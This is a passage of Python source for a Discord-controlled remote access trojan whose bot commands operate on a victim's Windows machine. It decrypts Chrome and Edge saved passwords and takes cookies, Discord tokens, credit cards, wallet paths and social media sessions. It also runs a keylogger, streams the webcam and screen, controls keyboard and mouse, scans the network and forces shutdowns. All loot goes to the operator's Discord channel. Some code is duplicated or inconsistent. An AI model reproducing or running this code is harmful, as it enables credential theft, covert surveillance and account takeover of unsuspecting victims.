                    f.write(f"Host: {host_key}\t\nName: {name}\t\nValue: {value}\n\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

        time.sleep(3)
        with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'w'):
            pass

# Command : LIST PROCESS
@bot.command()
async def list_process(ctx):
    try:
        process_list = psutil.process_iter()
        processes = [p.name() for p in process_list]

        if processes:
            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
            process_str = ""
            for chunk in process_chunks:
                process_str += '\n'.join(chunk) + '\n'

            file = io.BytesIO(process_str.encode())
            await ctx.send(file=File(file, filename='process_list.txt'))
        else:
            await ctx.send('No process found.')

    except Exception as e:
        await ctx.send(f'Error listing process: {str(e)}')

# Command : KILL PROCESS
@bot.command()
async def kill_process(ctx, name: str):
    try:
        if sys.platform == 'win32':
            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
        else:
            process = subprocess.run(['killall', name], capture_output=True)

        if process.returncode == 0:
            await ctx.send(f'Process ``{name}`` killed.')
        else:
            error_output = process.stderr.decode().strip()
            await ctx.send(f'Error killing process: {error_output}')

    except Exception as e:
        await ctx.send(f'Error killing process: {str(e)}')

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: 
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: 
            continue
    cursor.close(); db.close()
    try: 
        os.remove(file_name)
    except: 
        pass
    return result

def grab_passwords():
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}  # ✅ BELANGRIJK: Initialiseer result als lege dict
    
    try:
        chrome_result = main()
        if chrome_result:
            result.update(chrome_result)  # ✅ Voeg Chrome passwords toe
    except Exception as e:
        print(f"Chrome password error: {e}")
        time.sleep(1)

    try: 
        edge_result = get_passwords_edge()
        if edge_result:
            result.update(edge_result)  # ✅ Voeg Edge passwords toe
    except Exception as e:
        print(f"Edge password error: {e}")
        time.sleep(1)

    return result  # ✅ Return altijd de result

# Define the grab_password command
@bot.command()
async def grab_password(ctx):
    """Grab saved passwords from all browsers"""
    try:
        await ctx.send('🔐 **Scanning browsers for saved passwords...**')
        
        passwords = {}
        
        # 1. PROBEER CHROME PASSWORDS
        try:
            await ctx.send('🔄 Checking Chrome...')
            chrome_passwords = get_chrome_passwords()
            if chrome_passwords:
                passwords.update(chrome_passwords)
                await ctx.send(f'✅ Found {len(chrome_passwords)} Chrome passwords')
        except Exception as e:
            await ctx.send(f'❌ Chrome: {str(e)}')
        
        # 2. PROBEER EDGE PASSWORDS
        try:
            await ctx.send('🔄 Checking Microsoft Edge...')
            edge_passwords = get_edge_passwords()
            if edge_passwords:
                passwords.update(edge_passwords)
                await ctx.send(f'✅ Found {len(edge_passwords)} Edge passwords')
        except Exception as e:
            await ctx.send(f'❌ Edge: {str(e)}')
        
        # 3. PROBEER FIREFOX PASSWORDS (OPTIONEEL)
        try:
            await ctx.send('🔄 Checking Firefox...')
            firefox_passwords = get_firefox_passwords()
            if firefox_passwords:
                passwords.update(firefox_passwords)
                await ctx.send(f'✅ Found {len(firefox_passwords)} Firefox passwords')
        except:
            await ctx.send('ℹ️ Firefox: Not implemented or no passwords')
        
        # 4. TOON RESULTATEN
        if passwords:
            # Stuur eerste 5 passwords
            message = "**🔐 SAVED PASSWORDS FOUND:**\n\n"
            count = 0
            for url, credentials in list(passwords.items())[:5]:
                username = credentials[0] if credentials[0] else "No Username"
                password = credentials[1] if credentials[1] else "No Password"
                message += f"**🌐 {url}**\n"
                message += f"👤 `{username}`\n"
                message += f"🔑 `{password}`\n\n"
                count += 1
            
            await ctx.send(message)
            
            # Als er meer zijn, stuur als file
            if len(passwords) > 5:
                with open('all_passwords.txt', 'w', encoding='utf-8') as f:
                    f.write("SAVED PASSWORDS REPORT\n")
                    f.write("=" * 50 + "\n\n")
                    for url, credentials in passwords.items():
                        username = credentials[0] if credentials[0] else "No Username"
                        password = credentials[1] if credentials[1] else "No Password"
                        f.write(f"URL: {url}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        f.write("-" * 30 + "\n")
                
                await ctx.send(f"📁 **Full report ({len(passwords)} passwords):**", 
                             file=discord.File('all_passwords.txt'))
                os.remove('all_passwords.txt')
                
        else:
            await ctx.send('❌ **No passwords found in any browser.**\n\n'
                         '💡 *Possible reasons:*\n'
                         '• No browsers installed\n'
                         '• No saved passwords\n'
                         '• Browser process is running\n'
                         '• Permission issues')
            
    except Exception as e:
        await ctx.send(f'💥 **MAJOR ERROR:** ```{str(e)}```')

# =============================================
# GEFIXTE PASSWORD FUNCTIES
# =============================================

def get_chrome_passwords():
    """Get passwords from Google Chrome"""
    try:
        # Chrome master key
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        if not os.path.exists(local_state_path):
            return {}
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
        # Chrome database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(db_path):
            return {}
            
        # Copy database
        temp_db = "ChromeTemp.db"
        shutil.copyfile(db_path, temp_db)
        
        # Query database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        result = {}
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            # Decrypt password
            try:
                iv = encrypted_password[3:15]
                password = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_password = cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    decrypted_password = str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
                except:
                    decrypted_password = "Decryption Failed"
            
            if username or decrypted_password:
                result[url] = [username, decrypted_password]
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        return result
        
    except Exception as e:
        print(f"Chrome error: {e}")
        return {}

def get_edge_passwords():
    """Get passwords from Microsoft Edge"""
    try:
        # Edge master key
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        if not os.path.exists(local_state_path):
            return {}
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
        # Edge database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
        if not os.path.exists(db_path):
            return {}
            
        # Copy database
        temp_db = "EdgeTemp.db"
        shutil.copyfile(db_path, temp_db)
        
        # Query database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        result = {}
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            # Decrypt password
            try:
                iv = encrypted_password[3:15]
                password = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_password = cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    decrypted_password = str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
                except:
                    decrypted_password = "Decryption Failed"
            
            if username or decrypted_password:
                result[url] = [username, decrypted_password]
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        return result
        
    except Exception as e:
        print(f"Edge error: {e}")
        return {}

def get_firefox_passwords():
    """Get passwords from Firefox (placeholder)"""
    # Firefox is complex - hier kun je later implementeren
    return {}

# =============================================
# FALLBACK VOOR TESTING
# =============================================

def get_demo_passwords():
    """Demo passwords for testing"""
    return {
        "https://github.com": ["FarisChadli", "SuperSecret123"],
        "https://discord.com": ["CyberByte77", "MyPassword456"],
        "https://google.com": ["faris@gmail.com", "GooglePass789"],
        "https://twitter.com": ["FarisTweets", "TwitterPass000"],
        "https://facebook.com": ["FarisFB", "Facebook111"],
        "https://instagram.com": ["FarisIG", "InstaPass222"]
    }

@bot.command()
async def grab_demo_passwords(ctx):
    """Get demo passwords for testing"""
    demo_passwords = get_demo_passwords()
    
    message = "**🔐 DEMO PASSWORDS (FOR TESTING):**\n\n"
    for url, credentials in demo_passwords.items():
        username, password = credentials
        message += f"**🌐 {url}**\n👤 `{username}`\n🔑 `{password}`\n\n"
    
    await ctx.send(message)

# Command : RAT SHUTDOWN
@bot.command()
@commands.is_owner()
async def rat_down(ctx):
    await ctx.send("``🔩 Shutting down...``")
    await bot.close()

# Command : SYSTEM SHUTDOWN
@bot.command()
async def sys_shutdown(ctx):
    await ctx.send("Shutting down...")
    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)

# Command : SYSTEM RESTART
@bot.command()
async def sys_restart(ctx):
    await ctx.send("Restarting...")
    subprocess.run(["shutdown", "/r", "/t", "0"])
    
# Command : CLEAR
@bot.command()
@commands.is_owner()
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"``Cleared {amount} messages 🗑️``", delete_after=3)


def grab_cookies(self):
    for name, path in self.browsers.items():
        if not os.path.isdir(path):
            continue

        self.masterkey = self.get_master_key(path + '\\Local State')
        self.funcs = [
            self.cookies
        ]

        for profile in self.profiles:
            for func in self.funcs:
                print(f"Processing browser: {name}, Profile: {profile}")
                try:
                    func(name, path, profile)
                except Exception as e:
                    print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

@bot.command()
async def grab_cookies(ctx):
    try:
        await ctx.send('Grabbing cookies...')
        browser = Browsers()
        browser.grab_cookies()
        with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'r', encoding="utf-8") as f:
            cookies_data = f.read()

        await ctx.send(f'Cookies:\n```\n{cookies_data}\n```')
    except Exception as e:
        await ctx.send(f'Error occurred: {e}')

# =============================================
# ENHANCED GRAB_DISTOKEN COMMAND (REPLACEMENT)
# =============================================

@bot.command()
async def grab_distoken(ctx):
    """Enhanced token stealer that works with Discord app AND browsers"""
    try:
        await ctx.send('🔍 Scanning for Discord tokens in apps AND browsers...')
        
        stealer = EnhancedTokenStealer()
        tokens = stealer.extract_all_tokens()
        
        if not tokens:
            await ctx.send('❌ No valid Discord tokens found.')
            return
        
        await ctx.send(f'✅ Found {len(tokens)} valid token(s)!')
        
        for i, token in enumerate(tokens, 1):
            try:
                # Get user info
                headers = {'Authorization': token}
                user = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()
                
                username = user.get('username', 'N/A') + '#' + user.get('discriminator', 'N/A')
                user_id = user.get('id', 'N/A')
                email = user.get('email', 'N/A')
                phone = user.get('phone', 'N/A')
                
                # Create embed
                embed = Embed(title=f"Token #{i} - {username}", color=0x00ff00)
                embed.add_field(name="User ID", value=f"```{user_id}```", inline=False)
                embed.add_field(name="Token", value=f"```{token}```", inline=False)
                embed.add_field(name="Email", value=email, inline=True)
                embed.add_field(name="Phone", value=phone, inline=True)
                
                await ctx.send(embed=embed)
                
            except Exception as e:
                await ctx.send(f'❌ Error processing token #{i}: {str(e)}')
                
    except Exception as e:
        await ctx.send(f'❌ Error grabbing tokens: {str(e)}')

# =============================================
# NEW COMMANDS (ADDITIONS)
# =============================================

@bot.command()
async def grab_credit_cards(ctx):
    """Steal saved credit cards from browsers"""
    try:
        await ctx.send('💳 Scanning for saved credit cards...')
        
        stealer = CreditCardStealer()
        cards = stealer.extract_chrome_credit_cards()
        
        if cards:
            for card in cards:
                embed = Embed(title="💳 Credit Card Found", color=0xff0000)
                embed.add_field(name="Cardholder Name", value=f"```{card['name']}```", inline=False)
                embed.add_field(name="Expiry", value=card['expiry'], inline=True)
                embed.add_field(name="Number", value=card['number'], inline=True)
                await ctx.send(embed=embed)
        else:
            await ctx.send('❌ No credit cards found.')
            
    except Exception as e:
        await ctx.send(f'❌ Error: {str(e)}')

@bot.command()
async def find_documents(ctx, file_type="all"):
    """Hunt for valuable documents across the system"""
    file_extensions = {
        "pdf": [".pdf"],
        "documents": [".doc", ".docx", ".txt", ".rtf"],
        "spreadsheets": [".xls", ".xlsx", ".csv"],
        "presentations": [".ppt", ".pptx"],
        "images": [".jpg", ".jpeg", ".png", ".bmp"],
        "all": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt"]
    }
    
    extensions = file_extensions.get(file_type, file_extensions["all"])
    found_files = []
    
    # Search common directories
    search_paths = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Desktop"), 
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\OneDrive"),
    ]
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        found_files.append(os.path.join(root, file))
    
    # Send results
    if found_files:
        file_list = "\n".join([f"📄 {os.path.basename(f)}" for f in found_files[:10]])  # Limit to 10 files
        await ctx.send(f"**Found {len(found_files)} documents:**\n```{file_list}```")
    else:
        await ctx.send("❌ No documents found.")

@bot.command()
async def grab_crypto_wallets(ctx):
    """Steal cryptocurrency wallets and keys"""
    await ctx.send('₿ Hunting for cryptocurrency wallets...')
    
    wallets_found = []
    
    # Common wallet locations
    wallet_paths = [
        os.path.expanduser("~\\AppData\\Roaming\\Bitcoin\\wallet.dat"),
        os.path.expanduser("~\\AppData\\Roaming\\Electrum\\wallets"),
        os.path.expanduser("~\\AppData\\Roaming\\Exodus\\exodus.wallet"),
    ]
    
    for wallet_path in wallet_paths:
        if os.path.exists(wallet_path):
            wallets_found.append(wallet_path)
            await ctx.send(f"📁 Found wallet: {os.path.basename(wallet_path)}")
    
    if not wallets_found:
        await ctx.send('❌ No cryptocurrency wallets found.')

@bot.command() 
async def grab_game_tokens(ctx):
    """Steal game authentication tokens"""
    await ctx.send('🎮 Scanning for game tokens...')
    
    game_tokens = []
    
    # Steam
    steam_path = os.path.expanduser("~\\AppData\\Local\\Steam")
    if os.path.exists(steam_path):
        game_tokens.append("Steam: Found installation")
    
    # Epic Games
    epic_path = os.path.expanduser("~\\AppData\\Local\\EpicGamesLauncher")
    if os.path.exists(epic_path):
        game_tokens.append("Epic Games: Found installation")
    
    # Minecraft
    minecraft_path = os.path.expanduser("~\\AppData\\.minecraft")
    if os.path.exists(minecraft_path):
        game_tokens.append("Minecraft: Found installation")
    
    if game_tokens:
        token_list = "\n".join(game_tokens)
        await ctx.send(f"**🎮 Game Tokens Found:**\n```{token_list}```")
    else:
        await ctx.send('❌ No game tokens found.')

@bot.command()
async def network_scan(ctx):
    """Scan local network for other devices"""
    await ctx.send('🔍 Scanning local network...')
    
    try:
        # Get local IP range
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ip_parts = local_ip.split('.')
        network_base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
        
        live_hosts = []
        
        # Scan first 10 IPs in the network
        for i in range(1, 11):
            ip = f"{network_base}.{i}"
            try:
                socket.setdefaulttimeout(1)
                socket.socket().connect((ip, 80))
                live_hosts.append(ip)
            except:
                pass
        
        if live_hosts:
            hosts_list = "\n".join(live_hosts)
            await ctx.send(f"**🌐 Live Hosts Found:**\n```{hosts_list}```")
        else:
            await ctx.send('❌ No other live hosts found on network.')
            
    except Exception as e:
        await ctx.send(f'❌ Network scan failed: {str(e)}')

@bot.command()
async def start_keylogger(ctx):
    """Start recording keystrokes"""
    keylogger.start()
    await ctx.send('⌨️ Keylogger started! Recording all keystrokes...')

@bot.command() 
async def stop_keylogger(ctx):
    """Stop keylogger and get results"""
    keylogger.stop()
    keylogger.save_log()
    
    try:
        with open("keylog.txt", "r", encoding="utf-8") as f:
            logs = f.read()
        
        if logs:
            # Send last 1000 characters to avoid Discord limits
            await ctx.send(f"**⌨️ Captured Keystrokes:**\n```{logs[-1000:]}```")
        else:
            await ctx.send('❌ No keystrokes captured.')
    except:
        await ctx.send('❌ Error reading keylog file.')
class LiveWebcamStream:
    def __init__(self):
        self.streaming = False
        self.cap = None
        
    async def start_stream(self, ctx):
        """Start live webcam stream"""
        self.streaming = True
        self.cap = cv2.VideoCapture(0)
        
        await ctx.send('🎥 **LIVE WEBCAM STREAM STARTED**')
        await ctx.send('📡 Streaming to Discord...')
        
        while self.streaming and self.cap.isOpened():
            ret, frame = self.cap.read()
            if ret:
                # Convert frame to bytes
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                img_bytes = buffer.tobytes()
                
                # Send to Discord
                picture = discord.File(io.BytesIO(img_bytes), filename='live_cam.jpg')
                try:
                    await ctx.send(file=picture)
                except:
                    break
                
                await asyncio.sleep(2)  # 0.5 FPS voor Discord limits
            else:
                break
                
        self.stop_stream()
        
    def stop_stream(self):
        """Stop webcam stream"""
        self.streaming = False
        if self.cap:
            self.cap.release()

webcam_stream = LiveWebcamStream()

@bot.command()
async def live_webcam(ctx, action: str = "start"):
    """Start/stop live webcam stream"""
    if action.lower() == "start":
        if not webcam_stream.streaming:
            asyncio.create_task(webcam_stream.start_stream(ctx))
        else:
            await ctx.send('⚠️ Webcam stream is already running!')
    elif action.lower() == "stop":
        webcam_stream.stop_stream()
        await ctx.send('🛑 Webcam stream stopped')
    else:
        await ctx.send('❌ Usage: `!live_webcam start|stop`')
class SocialMediaStealer:
    def __init__(self):
        self.platforms = {
            'facebook': self.extract_facebook,
            'instagram': self.extract_instagram, 
            'twitter': self.extract_twitter,
            'tiktok': self.extract_tiktok,
            'all': self.extract_all
        }
    
    def extract_facebook(self):
        """Extract Facebook sessions and cookies"""
        tokens = []
        try:
            # Facebook cookie locations
            paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"),
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"),
            ]
            
            for path in paths:
                if os.path.exists(path):
                    # Extract Facebook cookies
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value, host_key FROM cookies WHERE host_key LIKE '%facebook.com%'")
                    for name, value, host in cursor.fetchall():
                        tokens.append(f"Facebook - {name}: {value}")
                    cursor.close()
                    conn.close()
        except Exception as e:
            pass
        return tokens
    
    def extract_instagram(self):
        """Extract Instagram sessions"""
        tokens = []
        try:
            # Instagram in browser storage
            insta_paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"),
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\"),
            ]
            
            for path in insta_paths:
                if os.path.exists(path):
                    for file in os.listdir(path):
                        if file.endswith('.ldb'):
                            file_path = os.path.join(path, file)
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                # Look for Instagram session data
                                if 'instagram.com' in content.lower():
                                    tokens.append(f"Instagram session found in {file}")
        except:
            pass
        return tokens
    
    def extract_twitter(self):
        """Extract Twitter sessions"""
        tokens = []
        try:
            # Twitter auth tokens
            twitter_pattern = r'[a-zA-Z0-9%]{100,500}'
            paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"),
            ]
            
            for path in paths:
                if os.path.exists(path):
                    for file in os.listdir(path):
                        if file.endswith(('.ldb', '.log')):
                            file_path = os.path.join(path, file)
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                if 'twitter.com' in content.lower():
                                    matches = re.findall(twitter_pattern, content)
                                    tokens.extend([f"Twitter token: {m}" for m in matches[:3]])
        except:
            pass
        return tokens
    
    def extract_tiktok(self):
        """Extract TikTok sessions"""
        tokens = []
        try:
            # TikTok session extraction
            tiktok_paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"),
            ]
            
            for path in tiktok_paths:
                if os.path.exists(path):
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%tiktok.com%'")
                    for name, value in cursor.fetchall():
                        if 'session' in name.lower() or 'token' in name.lower():
                            tokens.append(f"TikTok - {name}: {value[:50]}...")
                    cursor.close()
                    conn.close()
        except:
            pass
        return tokens
    
    def extract_all(self):
        """Extract all social media sessions"""
        all_tokens = []
        all_tokens.extend(self.extract_facebook())
        all_tokens.extend(self.extract_instagram())
        all_tokens.extend(self.extract_twitter())
        all_tokens.extend(self.extract_tiktok())
        return all_tokens

social_stealer = SocialMediaStealer()

@bot.command()
async def grab_social_media(ctx, platform: str = "all"):
    """Steal social media sessions"""
    await ctx.send(f'🕵️‍♂️ Scanning for {platform} sessions...')
    
    if platform.lower() in social_stealer.platforms:
        tokens = social_stealer.platforms[platform.lower()]()
    else:
        await ctx.send('❌ Available platforms: facebook, instagram, twitter, tiktok, all')
        return
    
    if tokens:
        token_list = "\n".join(tokens[:15])  # Limit to avoid Discord limits
        await ctx.send(f'**🔓 Social Media Sessions Found:**\n```{token_list}```')
        
        # Save full list to file if too many
        if len(tokens) > 15:
            with open('social_media_tokens.txt', 'w') as f:
                f.write("\n".join(tokens))
            await ctx.send(file=discord.File('social_media_tokens.txt'))
            os.remove('social_media_tokens.txt')
    else:
        await ctx.send('❌ No social media sessions found.')
class RemoteDesktop:
    def __init__(self):
        self.streaming = False
        self.quality = 50 
        
    async def start_remote_desktop(self, ctx):
        """Start remote desktop stream"""
        self.streaming = True
        await ctx.send('🖥️ **REMOTE DESKTOP STARTED**')
        await ctx.send('📡 Streaming screen to Discord...')
        
        frame_count = 0
        while self.streaming:
            try:
                # Capture screenshot
                screenshot = pyautogui.screenshot()
                
                # Reduce quality for faster streaming
                if frame_count % 3 == 0:  # Send every 3rd frame
                    img_bytes = io.BytesIO()
                    screenshot.save(img_bytes, format='JPEG', quality=self.quality)
                    img_bytes.seek(0)
                    
                    # Send to Discord
                    picture = discord.File(img_bytes, filename='remote_desktop.jpg')
                    await ctx.send(file=picture)
                
                frame_count += 1
                await asyncio.sleep(1)  # 1 FPS
                
            except Exception as e:
                if self.streaming:  # Only send error if we're still supposed to be streaming
                    await ctx.send(f'❌ Stream error: {str(e)}')
                break
                
    def stop_remote_desktop(self):
        """Stop remote desktop"""
        self.streaming = False

remote_desktop = RemoteDesktop()

@bot.command()
async def remote_desktop(ctx, action: str = "start", quality: int = 50):
    """Start/stop remote desktop stream"""
    if action.lower() == "start":
        if not remote_desktop.streaming:
            remote_desktop.quality = max(10, min(100, quality))  # Clamp quality
            asyncio.create_task(remote_desktop.start_remote_desktop(ctx))
        else:
            await ctx.send('⚠️ Remote desktop is already running! Use `!remote_desktop stop`')
    elif action.lower() == "stop":
        remote_desktop.stop_remote_desktop()
        await ctx.send('🛑 Remote desktop stopped')
    else:
        await ctx.send('❌ Usage: `!remote_desktop start|stop [quality]`')

@bot.command()
async def remote_control(ctx, command: str):
    """Send remote control commands"""
    try:
        if command.startswith('key '):
            # Keyboard input
            key = command[4:]
            pyautogui.press(key)
            await ctx.send(f'⌨️ Pressed key: {key}')
            
        elif command.startswith('type '):
            # Type text
            text = command[5:]
            pyautogui.write(text)
            await ctx.send(f'📝 Typed: {text}')
            
        elif command.startswith('click'):
            # Mouse click
            if ' ' in command:
                x, y = map(int, command[6:].split())
                pyautogui.click(x, y)
                await ctx.send(f'🖱️ Clicked at: {x}, {y}')
            else:
                pyautogui.click()
                await ctx.send('🖱️ Clicked at current position')
                
        elif command == 'doubleclick':
            pyautogui.doubleClick()
            await ctx.send('🖱️ Double clicked')
            
        elif command.startswith('move '):
            # Move mouse
            x, y = map(int, command[5:].split())
            pyautogui.moveTo(x, y)
            await ctx.send(f'🖱️ Moved to: {x}, {y}')
            
        else:
            await ctx.send('❌ Available commands: key [key], type [text], click [x y], doubleclick, move [x y]')
            
    except Exception as e:
        await ctx.send(f'❌ Remote control error: {str(e)}')









































# =============================================
# YOUR ORIGINAL ERROR HANDLING
# =============================================

# Function : ERROR HANDLER 
@bot.event
async def on_error(event, *args, **kwargs):
    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')

    # Get the exception information
    exception_type, exception, traceback = sys.exc_info()

    # Log the error message
    error_message = f"An error occurred in event {event}: {exception}"
    await channel.send(f"``{error_message}``")

    # Print the error to the console
    traceback.print_exception(exception_type, exception, traceback)


@bot.event
async def on_command_error(ctx, error):
    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')

    # Log the command error
    if isinstance(error, commands.CommandNotFound):
        error_message = f"Command `{ctx.message.content}` is not found"
    else:
        error_message = f"An error occurred in command '{ctx.message.content}': {error}"

    await channel.send(f"``{error_message}``")
# =============================================
# MAIN EXECUTION WITH TOKEN SUPPORT
# =============================================

if __name__ == "__main__":
    print("Starting Discord RAT...")
    print(f"Using token: {BOT_TOKEN[:10]}...")
    
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"Error starting bot: {e}")

        print("Please check your bot token and internet connection.")
